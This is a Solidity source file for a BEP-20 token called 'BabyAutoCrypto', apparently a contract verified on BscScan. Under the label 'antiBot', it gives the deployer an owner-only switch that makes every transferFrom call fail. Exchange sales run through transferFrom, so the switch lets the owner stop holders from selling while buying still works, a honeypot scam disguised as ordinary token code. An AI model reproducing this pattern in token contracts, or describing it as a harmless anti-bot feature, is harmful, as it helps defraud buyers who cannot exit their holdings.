/**
 *Submitted for verification at BscScan.com on 2021-10-15
*/

pragma solidity >=0.4.0 < 0.7.0;
pragma experimental ABIEncoderV2;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

interface IERC20 { 
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20Basic is IERC20 {
    
    string public constant name = "BabyAutoCrypto";
    string public constant symbol = "BABYAUTOCRYPTO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public fans;
    
    
    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(address indexed owner, address indexed spender, uint256 tokens);
    
    using SafeMath for uint256;
    
    mapping (address => uint) balances;
    mapping (address => mapping (address => uint)) allowed;
    bool private antiBot;
    
    constructor () public {
        antiBot = false;
        fans = msg.sender;
        balances[msg.sender] = totalSupply;
    }
    
    modifier onlyFans {
        require(msg.sender == fans);
        _;
    } 
    
    function balanceOf(address account) public override view returns (uint256) {
        return balances[account];
    }
    
    function allowance(address owner, address delegate) public override view returns (uint256) {
        return allowed[owner][delegate];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
       require(amount <= balances[msg.sender]);
       balances[msg.sender] = balances[msg.sender].sub(amount);
       balances[recipient] = balances[recipient].add(amount);
       
       emit Transfer(msg.sender, recipient, amount);
       return true;
    }
    
    function approve(address delegate, uint256 amount) public override returns (bool) {
        allowed[msg.sender][delegate] = amount;
        
        emit Approval(msg.sender, delegate, amount);
        return true;
    }
    
    function transferFrom(address owner, address buyer, uint256 amount) public override returns (bool) {
        require(antiBot==false);
        require(amount <= balances[owner]);
        require(amount <= allowed[owner][msg.sender]);
        
        balances[owner] = balances[owner].sub(amount);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(amount); 
        balances[buyer] = balances[buyer].add(amount);
        
        emit Transfer(owner, buyer, amount);
        return true;
    }
    
    function activateAntiBot(bool activate) public onlyFans returns(bool) {
        antiBot = activate;
        return true;
    }
    
    function antiBotValue() public view returns(bool){
        return antiBot;
    }
    
}